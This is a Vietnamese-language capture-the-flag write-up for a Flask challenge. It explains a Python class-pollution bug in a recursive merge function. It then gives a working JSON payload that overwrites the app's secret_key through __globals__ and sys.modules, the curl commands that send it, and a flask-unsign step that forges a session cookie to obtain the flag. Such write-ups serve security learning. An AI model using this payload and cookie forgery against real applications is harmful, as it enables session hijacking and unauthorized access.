## Hansel and gretel

Chall này là một chall về Flask app, ta cùng đi sơ qua các chức năng.

Để lấy flag, ta cần `session['user']=witch`:
```python
@app.route("/flag")
def flag():
    if session.get("user") != "witch":
        return render_template("template.html", status=403, message="You are not the witch.")
    return render_template("template.html", status=200, message=os.environ["FLAG"])
```

Khi truy cập vào trang web, server sẽ lấy bulletins từ `/load_bulletins` rồi render ra.
```python
@app.route("/")
def index():
    session["user"] = "hansel & gretel"
    bulletins = requests.post("http://localhost:3000/load_bulletins").json()
    return render_template("index.html", bulletins=bulletins)

@app.route("/load_bulletins", methods=["POST"])
def load_bulletins():
    return bulletin_board.load(), 200, {"Content-Type": "application/json"}
```

Ta có thể cập nhật bulletin ở `/save_bulletins`:
```python
@app.route("/save_bulletins", methods=["POST"])
def save_bulletins():
    if not request.is_json:
        raise Exception("Only accept JSON.")
    bulletin_board.save(request.data)
    return {"message": "Bulletins saved."}, 200, {"Content-Type": "application/json"}
```

Tiếp theo là chức năng save của bài này:

```python
def set_(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                set_(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            set_(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Board():
    def __init__(self): pass

    @property
    def pinned_content(self):
        return [{
            "title": "Our First Adventure!", 
            "text": "Today we went to the forest and you can't believe what we've got to! It's a house made out of gingerbread, cake and candy! How sweet it is!"
        }]
    
    current_content = []

    def save(self, data):
        data_ = json.loads(data)
        if "new_content" not in data_:
            raise Exception("There is nothing to save.")
        if not isinstance(data_["new_content"], list) and not len(data_["new_content"]) > 0 and not all([isinstance(x, dict) for x in data_["new_content"]]):
            raise Exception("\"new_content\" should be a non-empty list of JSON-like objects.")
        if not all(["title" in x and "text" in x for x in data_["new_content"]]):
            raise Exception("Please check your bulletin format")
        set_(data_, self)

    def load(self):
        res = self.pinned_content
        if isinstance(self.current_content, list) and len(self.current_content) > 0 and all(["title" in x and "text" in x for x in self.current_content]):
            res.extend(self.current_content)
        if hasattr(self, "new_content") and self.new_content is not None:
            new_content = getattr(self, "new_content")
            self.current_content.extend(new_content)
            res.extend(new_content)
            self.new_content = None
        return res[::-1]
```


`bulletin_board` là object của lớp `Board`, hàm save của nó yêu cầu kiểu dữ liệu có những trường như sau thì mới cho save:
```json
{
  "new_content": [
    {
      "title": "xxx",
      "text": "yyy"
    }
  ]
}
```

Sau khi đã thõa mãn, nó gọi đến hàm `set_` để lưu giá trị. Nhìn vào hàm `_set`, ta có thể liên tương đến hàm `merge` hai object trong javascript, quá quen thuộc với dạng prototype pollution.
```js
function merge(a, b) {
  for (var att in b) {
    if (typeof a[att] === "object" && typeof b[att] === "object") {
      merge(a[att], b[att]);
    } else {
      a[att] = b[att];
    }
  }
  return a;
}
```

Đề bài đang nhắm đến `prototype pollution` trong python. Rõ hơn về lỗ hổng này ở [đây](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

Để đọc được flag, ta cần đổi giá trị của `session['user']` thành `witch`. Trong Flask, session hoạt động tương tự như JWT, ta có thể thay đổi được session nếu chúng ta kiểm soát được giá trị của SECRET_KEY.

Thay vì sử dụng `app.config['SECRET_KEY'] = 'your_secret_key_here'` thì ta cũng có thể set `secret_key` bằng câu lệnh `app.secret_key = 'your_secret_key_here'`.

Gadget dẫn đến `app.secret` key như sau:
```
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

Payload:
```json
{
  "new_content": [
    {
      "title": "test",
      "text": "test"
    }
  ],
  "__class__": {
    "__init__": {
      "__globals__": {
        "__loader__": {
          "__init__": {
            "__globals__": {
              "sys": {
                "modules": {
                  "__main__": {
                    "app": {
                      "secret_key": "hehe"
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

```sh
curl -X POST -H "Content-Type: application/json" -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoibWVtb3J5IGxvc3QifQ.Fw-zd72pKScg-Zagzz_zl04doz84NgG2uPjr3yAcYu3DJ0Kp5rLaprBRKyQwdJ1232A791WQSaByIAwawzQsZ4XO8aVg6xmnnXEpHXU0Yb88jmNdP6jcjnOxyQ9zTpyQsnoy_raqYWhELCizXn-Y9QwKDXYk2WT1UMdWtLuZ4DYC043Y5glKlaVFTLhpilIPh5h3NlCRxdR9KSnPUO0ZK-8Bahw3onBTsjBgcK7exJLp374dGrdeijaM1jcCRzhb4SGpHHvT_JGYvTfQJW4P7JQM3u8dC4eK06bYwl3QGIlWqxGxc53IBGMzfkDUcEYYg5HCplDnJe-o128RxokUBQ; session=eyJ1c2VyIjoiaGFuc2VsICYgZ3JldGVsIn0.ZONgXA.DIju7ZSr4TrjnrOdnczIHbxl-lw" http://chall-us.pwnable.hk:30009/save_bulletins -d '{"new_content":[{"title":"test","text":"test"}],"__class__":{"__init__":{"__globals__":{"__loader__":{"__init__":{"__globals__":{"sys":{"modules":{"__main__":{"app":{"secret_key":"hehe"}}}}}}}}}}}'
{"message":"Bulletins saved."}
```

Bây giờ ta chỉ cần generate lại flask session là xong:

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

```sh
pwn@DESKTOP-AC6UABE:pts/0->/home/pwn (0)
>echo "eyJ1c2VyIjoiaGFuc2VsICYgZ3JldGVsIn0.ZONgXA.DIju7ZSr4TrjnrOdnczIHbxl-lw"|base64 --decode
{"user":"hansel & gretel"}base64: invalid input
>.local/bin/flask-unsign --sign --cookie '{"user":"witch"}' --secret 'hehe'
eyJ1c2VyIjoid2l0Y2gifQ.ZOOr-g.dHLUviIRBRcUcVvwYFsjteIhsMg
> curl -H "Cookie: session=eyJ1c2VyIjoid2l0Y2gifQ.ZOOr-g.dHLUviIRBRcUcVvwYFsjteIhsMg" http://chall-us.pwnable.hk:30009/flag
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Hansel & Gretel</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="container box-border flex flex-col items-center justify-center h-screen px-4 mx-auto text-center text-white bg-zinc-800">
    <h1 class="inline-block text-left w-fit">
        <span class="my-4 text-xl font-semibold">HTTP 200</span><br>
        <span class="my-4 text-4xl font-bold">b6actf{p0llute_the_w0r1d_4_sweet_sweet_c00k1es}</span><br>
    </h1>
</body>
</html>
```
